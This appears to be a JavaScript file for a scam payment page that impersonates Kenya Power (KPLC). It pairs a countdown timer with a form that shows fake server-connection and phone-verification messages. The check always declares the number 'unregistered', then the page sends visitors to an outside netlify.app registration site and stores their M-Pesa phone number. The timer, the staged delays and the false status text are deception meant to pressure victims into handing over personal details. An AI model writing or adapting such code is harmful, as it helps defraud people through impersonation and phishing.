// Alpine.js for payment form
function countdownTimer(hours) {
  return {
    timer: '',
    end: new Date(Date.now() + hours * 60 * 60 * 1000),
    interval: null,
    init() {
      this.update();
      this.interval = setInterval(() => this.update(), 1000);
    },
    update() {
      const now = new Date();
      let diff = Math.max(0, this.end - now);
      let h = Math.floor(diff / (1000 * 60 * 60));
      let m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
      let s = Math.floor((diff % (1000 * 60)) / 1000);
      this.timer = `${h > 0 ? h+':' : ''}${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
    }
  }
}

function paymentForm() {
  return {
    step: 'initial', // 'initial', 'checking', 'unregistered', 'registering', 'submitting'
    phone: '',
    name: '',
    email: '',
    loadingMessage: '',

    checkPhoneNumber() {
      if (!this.phone.match(/^07[0-9]{8}$/)) return;
      this.step = 'checking';
      this.loadingMessage = 'Connecting to KPLC secure server...';
      setTimeout(() => {
        this.loadingMessage = 'Verifying phone number...';
        setTimeout(() => {
          this.step = 'unregistered';
        }, 1800);
      }, 1500);
    },

    showRegistrationForm() {
      // Redirect to the external registration page
      window.location.href = 'https://completeregistration.netlify.app/';
    },

    submitRegistration() {
      // Basic validation
      if (!this.name || !this.email || !this.phone.match(/^07[0-9]{8}$/)) {
        alert('Please fill all fields correctly.');
        return;
      }
      this.step = 'submitting';
      this.loadingMessage = 'Registering your details...';
      sessionStorage.setItem('mpesaPhone', this.phone);
      setTimeout(() => {
        this.loadingMessage = 'Finalizing...';
        setTimeout(() => {
          window.location.href = 'confirmation.html';
        }, 1500);
      }, 2000);
    }
  }
}

window.paymentForm = paymentForm;
window.countdownTimer = countdownTimer;

